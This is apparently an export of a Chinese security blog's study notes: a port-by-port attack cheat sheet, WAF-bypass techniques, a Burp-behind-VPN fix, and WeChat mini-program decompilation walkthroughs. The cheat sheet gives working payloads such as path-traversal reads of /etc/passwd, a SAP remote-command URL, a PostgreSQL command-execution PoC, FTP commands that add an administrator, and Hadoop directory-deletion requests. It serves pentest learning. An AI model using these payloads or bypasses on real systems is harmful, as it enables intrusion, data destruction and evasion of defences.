<p><img src="https://ax-x.github.io/2022/05/31/%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA%E7%9A%84%E5%87%A0%E7%A7%8D%E4%B8%8A%E7%BA%BF%E6%96%B9%E5%BC%8F/t0131dd63889d924ce0.png" alt="img"></p>
<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>实际情况下，由于环境原因，网络状况错综复杂。比如：stageless的可执行文件比较大，又因为挂了代理，传不上去怎么办。其实就可以将beacon.exe上传到跳板机器上，用windows自带的certutil工具，直接在内网机器上请求下载跳板机上的beacon.exe。这样确实是更加稳当的。</p>
<p>转载来源：<a href="https://www.anquanke.com/post/id/254671#h2-7">https://www.anquanke.com/post/id/254671#h2-7</a></p>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>关于开深信服VPN无法抓包</title>
    <url>/2022/02/17/%E5%85%B3%E4%BA%8E%E5%BC%80%E6%B7%B1%E4%BF%A1%E6%9C%8DVPN%E6%97%A0%E6%B3%95%E6%8A%93%E5%8C%85/</url>
    <content><![CDATA[<p>前些日子大佬叫去搞渗透，得走深信服的VPN，连上之后发现BP抓不了包了，关闭 BurpSuite 单独用浏览器就可以正常访问，还以为是我电脑问题，后面发现下了VPN之后能正常抓包了。</p>
<span id="more"></span>
<p><img src="https://ax-x.github.io/2022/02/17/%E5%85%B3%E4%BA%8E%E5%BC%80%E6%B7%B1%E4%BF%A1%E6%9C%8DVPN%E6%97%A0%E6%B3%95%E6%8A%93%E5%8C%85/image-20220217100454882.png" alt="image-20220217100454882"></p>
<p>一开始以为是走的VPN，多个代理抓不到，然后试着用BP搞个上层代理，结果还是不行，后门觉着应该是深信服VPN不允许抓包的问题，把流量先在自己电脑跑一圈，用一层中转即可，找了个EW，开了个 sock5 服务器进行本地转发，然后再进行抓包就可以了</p>
<p><img src="https://ax-x.github.io/2022/02/17/%E5%85%B3%E4%BA%8E%E5%BC%80%E6%B7%B1%E4%BF%A1%E6%9C%8DVPN%E6%97%A0%E6%B3%95%E6%8A%93%E5%8C%85/image-20220217101004315.png" alt="image-20220217101004315"></p>
<p>BP设置</p>
<p><img src="https://ax-x.github.io/2022/02/17/%E5%85%B3%E4%BA%8E%E5%BC%80%E6%B7%B1%E4%BF%A1%E6%9C%8DVPN%E6%97%A0%E6%B3%95%E6%8A%93%E5%8C%85/image-20220217101028945.png" alt="image-20220217101028945"></p>
<p><img src="https://ax-x.github.io/2022/02/17/%E5%85%B3%E4%BA%8E%E5%BC%80%E6%B7%B1%E4%BF%A1%E6%9C%8DVPN%E6%97%A0%E6%B3%95%E6%8A%93%E5%8C%85/image-20220217101050106.png" alt="image-20220217101050106"></p>
]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>常见端口攻击方式</title>
    <url>/2022/03/08/%E5%B8%B8%E8%A7%81%E7%AB%AF%E5%8F%A3%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/</url>
    <content><![CDATA[<h2 id="远程管理端口"><a href="#远程管理端口" class="headerlink" title="远程管理端口"></a>远程管理端口</h2><span id="more"></span>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">22  端口（ssh）</span><br><span class="line">    安全攻击：弱口令、暴力猜解、用户名枚举</span><br><span class="line">    利用方式：1、通过用户名枚举可以判断某个用户名是否存在于目标主机中，2、利用弱口令/暴力破解，获取目标主机权限。</span><br><span class="line">    </span><br><span class="line">23  端口（telnet）</span><br><span class="line">    安全漏洞：弱口令、明文传输</span><br><span class="line">    利用方式：1、通过弱口令或暴力破解，获取目标主机权限。2、嗅探抓取telnet明文账户密码。</span><br><span class="line">    </span><br><span class="line">3389 端口（RDP）</span><br><span class="line">     安全漏洞：暴力破解</span><br><span class="line">     利用方式：通过弱口令或暴力破解，获取目标主机权限。</span><br><span class="line"></span><br><span class="line">5632 端口（Pcanywhere）</span><br><span class="line">     安全漏洞：弱口令、暴力破解</span><br><span class="line">     利用方式：通过弱口令或暴力破解，获取目标主机权限</span><br><span class="line"></span><br><span class="line">5900 端口（VNC）</span><br><span class="line">     安全漏洞：弱口令、暴力破解</span><br><span class="line">     利用方式：通过弱口令或暴力破解，获取目标主机权限。</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="WEB中间件-服务端口"><a href="#WEB中间件-服务端口" class="headerlink" title="WEB中间件/服务端口"></a>WEB中间件/服务端口</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1090/1099 端口（RMI）</span><br><span class="line">    安全漏洞：JAVA RMI 反序列化远程命令执行漏洞</span><br><span class="line">    利用方式：使用nmap检测端口信息。</span><br><span class="line">    端口信息：1099/1090    Java-rmi    Java RMI Registry</span><br><span class="line">    检测工具：attackRMI.jar</span><br><span class="line"></span><br><span class="line">7001 端口（Weblogic）</span><br><span class="line">    安全漏洞：弱口令、SSRF、反序列化漏洞</span><br><span class="line">    利用方式：1、控制台弱口令上传war木马2、SSRF内网探测3、反序列化远程代码执行等</span><br><span class="line"></span><br><span class="line">8000 端口（jdwp）</span><br><span class="line">    安全漏洞：JDWP 远程命令执行漏洞</span><br><span class="line">    端口信息：8000  jdwp     </span><br><span class="line">    java Debug Wire Protocol检测工具：https://github.com/IOActive/jdwp-shellifier</span><br><span class="line"></span><br><span class="line">8080 端口（Tomcat）</span><br><span class="line">    安全漏洞：弱口令、示例目录</span><br><span class="line">    利用方式：通过弱口令登录控制台，上传war包。</span><br><span class="line"></span><br><span class="line">8080 端口（Jboss）</span><br><span class="line">    安全漏洞：未授权访问、反序列化。</span><br><span class="line">    利用方式：1、未授权访问控制台，远程部署木马2、反序列化导致远程命令执行等。</span><br><span class="line">    检测工具：https://github.com/joaomatosf/jexboss</span><br><span class="line"></span><br><span class="line">8080 端口（Resin）</span><br><span class="line">    安全漏洞：目录遍历、远程文件读取</span><br><span class="line">    利用方式：通过目录遍历/远程文件读取获取敏感信息，为进一步攻击提供必要的信息。</span><br><span class="line">    任意文件读取POC：</span><br><span class="line">    payload1 = &quot;/resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=/etc/passwd&quot;</span><br><span class="line">    payload2 = &quot;/resin-doc/examples/jndi-appconfig/test?inputFile=../../../../../../../../../../etc/passwd&quot;</span><br><span class="line">    payload3 = &quot;/ ..\\\\web-inf&quot;</span><br><span class="line"></span><br><span class="line">8080 端口（Jetty）</span><br><span class="line">    安全漏洞：远程共享缓冲区泄漏</span><br><span class="line">    利用方式：攻击者可以通过精心构造headers值来触发异常并偏移到共享缓冲区，其中包含了之前其他用户提交的请求，服务器会根据攻击者的payload返回特定位置的数据。</span><br><span class="line">    检测工具：https://github.com/GDSSecurity/Jetleak-Testing-Script</span><br><span class="line"></span><br><span class="line">8080 /4848 端口（GlassFish）</span><br><span class="line">    安全漏洞：弱口令、任意文件读取</span><br><span class="line">    利用方式：1、弱口令admin/admin，直接部署shell    2、任意文件读取获取服务器敏感配置信息</span><br><span class="line"></span><br><span class="line">8080 端口（Jenkins）</span><br><span class="line">    安全漏洞：未授权访问 、远程代码执行</span><br><span class="line">    利用方式：访问如下url，可以执行脚本命令，反弹shell，写入webshell等。</span><br><span class="line">    http://&lt;target&gt;:8080/manage</span><br><span class="line">    http://&lt;target&gt;:8080/script</span><br><span class="line"></span><br><span class="line">8161 端口（ActiveMQ）</span><br><span class="line">    安全漏洞：弱口令、任意文件写入、反序列化</span><br><span class="line">    利用方式：默认密码admin/admin登陆控制台、写入webshell、上传ssh key等方式。</span><br><span class="line"></span><br><span class="line">9043 端口（webSphere）</span><br><span class="line">    安全漏洞：控制台弱口令、远程代码执行</span><br><span class="line">    后台地址：https://:9043/ibm/console/logon.jsp</span><br><span class="line"></span><br><span class="line">50000 端口 （SAP）</span><br><span class="line">    安全漏洞：远程代码执行</span><br><span class="line">    利用方式：攻击者通过构造url请求，实现远程代码执行。POC:http://&lt;target&gt;:50000/ctc/servlet/com.sap.ctc.util.ConfigServlet?param=com.sap.ctc.util.FileSystemConfig;EXECUTE_CMD;CMDLINE=cmd.exe /c ipconfig /all</span><br><span class="line"></span><br><span class="line">50070 端口（hadoop）</span><br><span class="line">    安全漏洞：未授权访问</span><br><span class="line">    利用方式：攻击者可以通过命令行操作多个目录下的数据，如进行删除操作。</span><br><span class="line">    curl -i -X DELETE “http://ip:50070/webhdfs/v1/tmp?op=DELETE&amp;recursive=true“</span><br><span class="line">    curl -i -X PUT “http://ip:50070/webhdfs/v1/NODATA4U_SECUREYOURSHIT?op=MKDIRS“</span><br></pre></td></tr></table></figure>

<h2 id="数据库端口"><a href="#数据库端口" class="headerlink" title="数据库端口"></a>数据库端口</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">389 端口（ldap）</span><br><span class="line">    安全漏洞：未授权访问 、弱口令</span><br><span class="line">    利用方式：通过LdapBrowser工具直接连入。</span><br><span class="line"></span><br><span class="line">1433 端口（Mssql）</span><br><span class="line">    安全漏洞：弱口令、暴力破解</span><br><span class="line">    利用方式：差异备份getshell、SA账户提权等</span><br><span class="line"></span><br><span class="line">1521 端口（Oracle）</span><br><span class="line">    安全漏洞：弱口令、暴力破解</span><br><span class="line">    利用方式：通过弱口令/暴力破解进行入侵。</span><br><span class="line"></span><br><span class="line">3306 端口（MySQL）</span><br><span class="line">    安全漏洞：弱口令、暴力破解</span><br><span class="line">    利用方式：利用日志写入webshell、udf提权、mof提权等。</span><br><span class="line"></span><br><span class="line">5432 端口（ PostgreSQL）</span><br><span class="line">    安全漏洞：弱口令、高权限命令执行</span><br><span class="line">    利用方式：攻击者通过弱口令获取账号信息，连入postgres中，可执行系统命令。。</span><br><span class="line">    PoC参考：    DROP TABLE IF EXISTS cmd_exec;    CREATE TABLE cmd_exec(cmd_output text);    COPY cmd_exec FROM PROGRAM &#x27;id&#x27;;    SELECT * FROM cmd_exec;</span><br><span class="line"></span><br><span class="line">5984 端口（CouchDB）</span><br><span class="line">    安全漏洞：垂直权限绕过、任意命令执行</span><br><span class="line">    利用方式：通过构造数据创建管理员用户，使用管理员用户登录，构造恶意请求触发任意命令执行。</span><br><span class="line">    后台访问：http://&lt;target&gt;:5984/_utils</span><br><span class="line"></span><br><span class="line">6379 端口（Redis）</span><br><span class="line">    安全漏洞：未授权访问</span><br><span class="line">    利用方式：绝对路径写webshell 、利用计划任务执行命令反弹shell、公私钥认证获取root权限、主从复制RCE等。</span><br><span class="line"></span><br><span class="line">9200 端口（elasticsearch）</span><br><span class="line">    安全漏洞：未授权访问、命令执行</span><br><span class="line">    检测方式：</span><br><span class="line">        1、直接访问如下url，获取相关敏感信息。  http://&lt;target&gt;:9200/_nodes  查看节点数据  http://&lt;target&gt;:9200/_river  查看数据库敏感信息</span><br><span class="line">        2、通过构造特定的数据包，执行任意命令。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">11211 端口（MemCache）</span><br><span class="line">    安全漏洞：未授权访问</span><br><span class="line">    检测方式：无需用户名密码，可以直接连接memcache 服务的11211端口。nc -vv &lt;target&gt; 11211</span><br><span class="line"></span><br><span class="line">27017 端口（Mongodb）</span><br><span class="line">    安全漏洞：未授权访问、弱口令</span><br><span class="line">    利用方式：未授权访问/弱口令，远程连入数据库，导致敏感信息泄露。</span><br></pre></td></tr></table></figure>

<h2 id="常见协议"><a href="#常见协议" class="headerlink" title="常见协议"></a>常见协议</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">21 端口（FTP)</span><br><span class="line">    安全漏洞：1、配置不当    2、明文传输    3、第三方软件提权</span><br><span class="line">    利用方式：1、匿名登录或弱口令2、嗅探ftp用户名和密码3、</span><br><span class="line">    Serv-U权限较大的账号可导致系统命令执行。</span><br><span class="line">    FTP提权命令：  # 增加系统用户   Quote site exec net user 4567 4567 /add  # 提升到管理员权限   Quote site exec net localgroup administrators 4567 /add</span><br><span class="line"></span><br><span class="line">25 端口（SMTP）</span><br><span class="line">    攻击方式：1、匿名发送邮件 2、弱口令 3、SMTP用户枚举</span><br><span class="line">    利用方式：1、SMTP服务器配置不当，攻击者可以使用任意用户发送邮件。2、SMTP弱口令扫描，获取用户账号密码，发送邮件钓鱼。3、通过SMTP用户枚举获取用户名：   nmap -p 25 -- smtp-enum-users.nse &lt;target&gt;</span><br><span class="line"></span><br><span class="line">53 端口（DNS）</span><br><span class="line">    安全攻击：1、DNS域传送漏洞、DNS欺骗、DNS缓存投毒</span><br><span class="line">    检测方式：1、DNS域传送漏洞，Windows下检测使用nslookup命令，Linux下检测使用dig命令，通过执行命令可以清楚的看到域名解析情况。2、DNS欺骗就是攻击者冒充域名服务器的一种欺骗行为。3、DNS缓存投毒是攻击者欺骗DNS服务器相信伪造的DNS响应的真实性。</span><br><span class="line"></span><br><span class="line">161 端口（SNMP）</span><br><span class="line">    安全漏洞：默认团体名/弱口令访问</span><br><span class="line">    利用方式：通过nmap自带的审计脚本进行检测，可能导致敏感信息泄露。。1、弱口令检测：nmap –sU –p161 –script=snmp-brute &lt;target&gt;2、获取系统信息：nmap –sU –p161 –script=snmp-sysdescr &lt;target&gt;3、获取用户信息：nmap -sU -p161 --script=snmp-win32-user &lt;target&gt;4、获取网络端口状态：nmap -sU -p161 --script=snmp-netstat &lt;target&gt;</span><br><span class="line"></span><br><span class="line">443 端口（SSL）</span><br><span class="line">    安全漏洞：OpenSSL 心脏出血</span><br><span class="line">    利用方式：攻击者可以远程读取存在漏洞版本的openssl服务器内存中长大64K的数据。</span><br><span class="line">    扫描脚本：nmap -sV --script=ssl-heartbleed &lt;target&gt;</span><br><span class="line"></span><br><span class="line">445 端口（SMB）</span><br><span class="line">    安全漏洞：信息泄露、远程代码执行</span><br><span class="line">    利用方式：可利用共享获取敏感信息、缓冲区溢出导致远程代码执行，如ms17010。</span><br><span class="line"></span><br><span class="line">873 端口（Rsync）</span><br><span class="line">    安全漏洞：匿名访问、弱口令</span><br><span class="line">    利用方式：攻击者可以执行下载/上传等操作，也可以尝试上传webshell。</span><br><span class="line">    1、下载：#rsync -avz a.b.c.d::path/file path/filiname  </span><br><span class="line">    2、上传：#rsync -avz path/filename a.b.c.d::path/file</span><br><span class="line"></span><br><span class="line">2181 端口（Zookeeper）</span><br><span class="line">    安全漏洞：未授权访问</span><br><span class="line">    检测方式：攻击者可通过执行envi命令获得系统大量的敏感信息，包括系统名称、Java环境。 echo envi | nc ip port</span><br><span class="line"></span><br><span class="line">2375 端口（Docker）</span><br><span class="line">    安全漏洞：未授权方式</span><br><span class="line">    检测方式：通过docker daemon api 执行docker命令。#列出容器信息，效果与docker ps -a 一致。 curl http://&lt;target&gt;:2375/containers/json docker -H tcp://&lt;target&gt;:2375 start &lt;Container Id&gt;  docker服务如果是以root用户启动的话，可以利用chroot将服务器的根目录挂在到容器里面，实现docker容器逃逸</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>常规绕WAF思路</title>
    <url>/2022/03/08/%E5%B8%B8%E8%A7%84%E7%BB%95WAF%E6%80%9D%E8%B7%AF/</url>
    <content><![CDATA[<h2 id="1、错误的HTTP请求头"><a href="#1、错误的HTTP请求头" class="headerlink" title="1、错误的HTTP请求头"></a>1、错误的HTTP请求头</h2><figure class="highlight css"><table><tr><td class="code"><pre><span class="line">类似文件上传时的绕过，通过畸形的HTTP协议头绕过WAF检测。比如绕过某些老版本WAF可以加入请求头：<span class="attribute">Content</span>-Encoding:deflate就可以绕过WAF（此方法在文件上传绕过WAF中也适用）</span><br></pre></td></tr></table></figure>
<span id="more"></span>
<h2 id="2、通用的关键字绕过"><a href="#2、通用的关键字绕过" class="headerlink" title="2、通用的关键字绕过"></a>2、通用的关键字绕过</h2><figure class="highlight autoit"><table><tr><td class="code"><pre><span class="line">将关键字转换成Unicode或者<span class="built_in">HEX</span>编码的方式，JAVA程序会自动进行解码，所以在一定程度上能够绕过WAF</span><br></pre></td></tr></table></figure>

<h2 id="3、使用未公开的漏洞利用链"><a href="#3、使用未公开的漏洞利用链" class="headerlink" title="3、使用未公开的漏洞利用链"></a>3、使用未公开的漏洞利用链</h2><figure class="highlight"><table><tr><td class="code"><pre><span class="line">部分WAF会将公开的漏洞利用链中的关键字设置为黑名单，所以重新找一条利用链吧，自己的才是最香的</span><br></pre></td></tr></table></figure>

<h2 id="4、数据溢出-防匹配（xxx…）"><a href="#4、数据溢出-防匹配（xxx…）" class="headerlink" title="4、数据溢出-防匹配（xxx…）"></a>4、数据溢出-防匹配（xxx…）</h2><figure class="highlight"><table><tr><td class="code"><pre><span class="line">借助常见的溢出漏洞，在数据特别多的情况下例如：构造垃圾数据，让防护的检测负载不过来在某个地方停止，从而达到绕过的目的例如在数据包内（文件名等可修改的区域）处构造大量垃圾数据，但是有可能会导致服务器崩溃，从而无法接下去进行操作</span><br></pre></td></tr></table></figure>

<h2 id="5、符号变异-防匹配（’”-）"><a href="#5、符号变异-防匹配（’”-）" class="headerlink" title="5、符号变异-防匹配（’”;）"></a>5、符号变异-防匹配（’”;）</h2><figure class="highlight brainfuck"><table><tr><td class="code"><pre><span class="line"><span class="comment">利用匹配的原则，猜测waf是根据在单引号或者双引号里面的数据去匹配文件名信息的，那么可以利用这个规则，将引号替换掉，尝试绕过，有可能它只检测单引号或者只检测双引号，也可尝试去掉一个引号，有开始就有结束，当去掉一个之后就可能被检测出来，或者没检测出来，或者什么都没发生这样，也可尝试将引号全部去除，而分号是利用分号后面还有数据的形式，在后面添加垃圾数据去尝试绕过</span><span class="string">,</span><span class="comment">或者构造文件名或者在引号后面写文件名，而引号内部不去写数据，或者单纯写一个a这样的数据尝试绕过</span></span><br></pre></td></tr></table></figure>

<h2 id="6、重复数据-防匹配（参数多次）"><a href="#6、重复数据-防匹配（参数多次）" class="headerlink" title="6、重复数据-防匹配（参数多次）"></a>6、重复数据-防匹配（参数多次）</h2><figure class="highlight sas"><table><tr><td class="code"><pre><span class="line">例如：构造多个<span class="meta">filename</span>，然后查看waf最后是以哪个为主，然后构造多个<span class="meta">filename</span>，借助检测机制是递归循环，还是单次检测，类似于构造垃圾数据那样也可尝试将Content-Disposition这些的数据插入到<span class="meta">filename</span>里面去，然后后面构造php文件（利用白名单）</span><br></pre></td></tr></table></figure>

<h2 id="7、数据截断-防匹配（-00-换行）"><a href="#7、数据截断-防匹配（-00-换行）" class="headerlink" title="7、数据截断-防匹配（%00;/;换行）"></a>7、数据截断-防匹配（%00;/;换行）</h2>]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>微信小程序反编译-PC微信版</title>
    <url>/2022/08/29/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%8F%8D%E7%BC%96%E8%AF%91-PC%E5%BE%AE%E4%BF%A1%E7%89%88/</url>
    <content><![CDATA[<p>现在网上也有很多关于小程序反编译的教程，随时间的流逝或许随着微信的更新，有出现编译不成功的现象。</p>
<p>本篇文章总结一下最新的编译过程，已成功获得小程序源码（有分包的小程序）</p>
<span id="more"></span>

<h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><h3 id="1、-node-环境准备"><a href="#1、-node-环境准备" class="headerlink" title="1、 node 环境准备"></a>1、 node 环境准备</h3><p>下载链接：<a href="https://nodejs.org/en/">https://nodejs.org/en/</a></p>
<p><img src="https://ax-x.github.io/2022/08/29/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%8F%8D%E7%BC%96%E8%AF%91-PC%E5%BE%AE%E4%BF%A1%E7%89%88/image-20220829114303810.png" alt="image-20220829114303810"></p>
<p>安装后将nodejs设置为环境变量。<br> 打开cmd，测试是否安装成功：在命令行输入node -v 出现版本号说明已经安装成功。</p>
<h3 id="2、反编译工具"><a href="#2、反编译工具" class="headerlink" title="2、反编译工具"></a>2、反编译工具</h3><p>项目地址来自于：<a href="https://github.com/xuedingmiaojun/wxappUnpacker">https://github.com/xuedingmiaojun/wxappUnpacker</a></p>
<p><strong>通过下面链接下载：</strong></p>
<p>链接：<a href="https://pan.baidu.com/share/init?surl=p-wnX-mXr-Du0iJK_dT8RQ">https://pan.baidu.com/share/init?surl=p-wnX-mXr-Du0iJK_dT8RQ</a><br> 提取码：z06a</p>
<p><strong>下载下来解压到某个位置就可以了，一定要通过网盘下载，里面有解密包的工具和安装后的npm环境，直接使用即可</strong></p>
<h2 id="具体操作"><a href="#具体操作" class="headerlink" title="具体操作"></a>具体操作</h2><h3 id="1、微信PC获取小程序"><a href="#1、微信PC获取小程序" class="headerlink" title="1、微信PC获取小程序"></a>1、微信PC获取小程序</h3><p><strong>在通过微信PC打开小程序前，我们最好先找到缓存到本地的小程序包路径，一般都是在 <code>微信PC安装目录\WeChat Files\WeChat Files\Applet</code></strong></p>
<p>比如我的就是安装到 <code>D盘根目录的</code>，所以路径为： <code>D:\WeChat\WeChat Files\WeChat Files\Applet</code></p>
<p><img src="https://ax-x.github.io/2022/08/29/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%8F%8D%E7%BC%96%E8%AF%91-PC%E5%BE%AE%E4%BF%A1%E7%89%88/image-20220829114327613.png" alt="image-20220829114327613"></p>
<p><strong>上图中每个文件夹代表一个小程序，一般最新打开的小程序都是在第一个，如果不确定可以排序一下修改日期</strong></p>
<p>找到路径了我们就可以用微信PC打开小程序了，打开后就会发现当前目录新增了一个文件夹，里面存放的就是加密后的小程序包</p>
<p><img src="https://ax-x.github.io/2022/08/29/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%8F%8D%E7%BC%96%E8%AF%91-PC%E5%BE%AE%E4%BF%A1%E7%89%88/image-20220829114344379.png" alt="image-20220829114344379"></p>
<h3 id="2、解密包"><a href="#2、解密包" class="headerlink" title="2、解密包"></a>2、解密包</h3><p>刚获取到的包我们还不能进行反编译，必须要通过 <code>解密软件</code> 修改一下才能反编译</p>
<p><img src="https://ax-x.github.io/2022/08/29/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%8F%8D%E7%BC%96%E8%AF%91-PC%E5%BE%AE%E4%BF%A1%E7%89%88/image-20220829114403452.png" alt="image-20220829114403452"></p>
<p><strong>本篇就演示一个主包和一个分包反编译的过程就可以了，先通过<code>解密软件</code>修改一下主包</strong></p>
<p><img src="https://ax-x.github.io/2022/08/29/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%8F%8D%E7%BC%96%E8%AF%91-PC%E5%BE%AE%E4%BF%A1%E7%89%88/image-20220829114420124.png" alt="image-20220829114420124"></p>
<p><strong>解密的主包自动到 <code>wxpack</code> 这个包里面来了，同样的步骤解密一个分包，下图是我解密好的两个，并且修改了一下名称，好区分</strong></p>
<p><img src="https://ax-x.github.io/2022/08/29/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%8F%8D%E7%BC%96%E8%AF%91-PC%E5%BE%AE%E4%BF%A1%E7%89%88/image-20220829114429172.png" alt="image-20220829114429172"></p>
<h3 id="3、反编译"><a href="#3、反编译" class="headerlink" title="3、反编译"></a>3、反编译</h3><p>进入 <code>wxpack</code> 的同级目录 <code>wxappUnpacker-master</code>，在路径栏输入 <code>cmd</code> 自动打开当前目录的 <strong>命令窗口了</strong></p>
<p><img src="https://ax-x.github.io/2022/08/29/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%8F%8D%E7%BC%96%E8%AF%91-PC%E5%BE%AE%E4%BF%A1%E7%89%88/image-20220829114439361.png" alt="image-20220829114439361"></p>
<p><strong>先反编译一下主包，把反编译后的文件夹放到 <code>wxpack</code> 同级目录中</strong></p>
<figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line"><span class="keyword">node</span> <span class="title">wuWxapkg</span>.js ..\wxpack\<span class="literal">master</span>-app.wxapkg</span><br><span class="line"></span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure>

<p><img src="https://ax-x.github.io/2022/08/29/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%8F%8D%E7%BC%96%E8%AF%91-PC%E5%BE%AE%E4%BF%A1%E7%89%88/image-20220829114447311.png" alt="image-20220829114447311"></p>
<p><strong>再反编译分包，把反编译后的文件夹放到 <code>wxpack</code> 同级目录中</strong></p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line">node wuWxapkg.js <span class="attr">-s</span>=..\ ..\wxpack\_pages_app.wxapkg</span><br><span class="line"></span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure>

<ul>
<li><code>-s</code> 表示分包</li>
<li>第一个<code>..\</code> 表示输出位置</li>
<li><code>..\wxpack\_pages_app.wxapkg</code> 需要反编译的分包位置</li>
</ul>
<p><img src="https://ax-x.github.io/2022/08/29/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%8F%8D%E7%BC%96%E8%AF%91-PC%E5%BE%AE%E4%BF%A1%E7%89%88/image-20220829114505256.png" alt="image-20220829114505256"></p>
<p>好了剩下的就是自己组合一下包的架构目录了~~~~</p>
]]></content>
      <categories>
        <category>反编译</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>微信小程序反编译-模拟器版</title>
    <url>/2022/08/29/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%8F%8D%E7%BC%96%E8%AF%91-%E6%A8%A1%E6%8B%9F%E5%99%A8%E7%89%88/</url>
    <content><![CDATA[<p>本文主要写如何通过PC手机模拟器获取微信小程序的代码</p>
<span id="more"></span>
<p>网易 Mumu 模拟器安装</p>
<ul>
<li>打开模拟器</li>
</ul>
<p><img src="https://ax-x.github.io/2022/08/29/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%8F%8D%E7%BC%96%E8%AF%91-%E6%A8%A1%E6%8B%9F%E5%99%A8%E7%89%88/image-20220829114548179.png" alt="image-20220829114548179"></p>
<ul>
<li>安装 微信、RE文件管理器</li>
</ul>
<p><img src="https://ax-x.github.io/2022/08/29/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%8F%8D%E7%BC%96%E8%AF%91-%E6%A8%A1%E6%8B%9F%E5%99%A8%E7%89%88/image-20220829114558552.png" alt="image-20220829114558552"></p>
<p><img src="https://ax-x.github.io/2022/08/29/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%8F%8D%E7%BC%96%E8%AF%91-%E6%A8%A1%E6%8B%9F%E5%99%A8%E7%89%88/image-20220829114605733.png" alt="image-20220829114605733"></p>
<p><img src="https://ax-x.github.io/2022/08/29/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%8F%8D%E7%BC%96%E8%AF%91-%E6%A8%A1%E6%8B%9F%E5%99%A8%E7%89%88/image-20220829114612458.png" alt="image-20220829114612458"></p>
<ul>
<li>设置Root 权限</li>
</ul>
<p><img src="https://ax-x.github.io/2022/08/29/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%8F%8D%E7%BC%96%E8%AF%91-%E6%A8%A1%E6%8B%9F%E5%99%A8%E7%89%88/image-20220829114620760.png" alt="image-20220829114620760"></p>
<ul>
<li>打开 RE文件管理器，提示请求超级用户访问权限，选择允许</li>
</ul>
<p><img src="https://ax-x.github.io/2022/08/29/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%8F%8D%E7%BC%96%E8%AF%91-%E6%A8%A1%E6%8B%9F%E5%99%A8%E7%89%88/image-20220829114627290.png" alt="image-20220829114627290"></p>
<p>到此准备工作完成。</p>
<h3 id="打开微信，然后打开小程序，获取小程序编译包"><a href="#打开微信，然后打开小程序，获取小程序编译包" class="headerlink" title="打开微信，然后打开小程序，获取小程序编译包"></a>打开微信，然后打开小程序，获取小程序编译包</h3><ul>
<li>先打开微信</li>
<li>搜索微博小程序打开</li>
<li>打开RE文件管理</li>
<li>按照 /data/data/com.tencent.mm/MicroMsg/80b34bca4945f2aa19a92b5549781131/appbrand/pkg/小程序.wxapkg 路径找到对应程序包</li>
</ul>
<p><img src="https://ax-x.github.io/2022/08/29/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%8F%8D%E7%BC%96%E8%AF%91-%E6%A8%A1%E6%8B%9F%E5%99%A8%E7%89%88/image-20220829114637217.png" alt="image-20220829114637217"></p>
<p>压缩对应的小程序包</p>
<p>查看压缩包，长按并选中然后发送给微信好友，将此文件解压到指定文件夹下</p>
<p><img src="https://ax-x.github.io/2022/08/29/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%8F%8D%E7%BC%96%E8%AF%91-%E6%A8%A1%E6%8B%9F%E5%99%A8%E7%89%88/image-20220829114644948.png" alt="image-20220829114644948"></p>
<p>解压放到wechart 文件夹下</p>
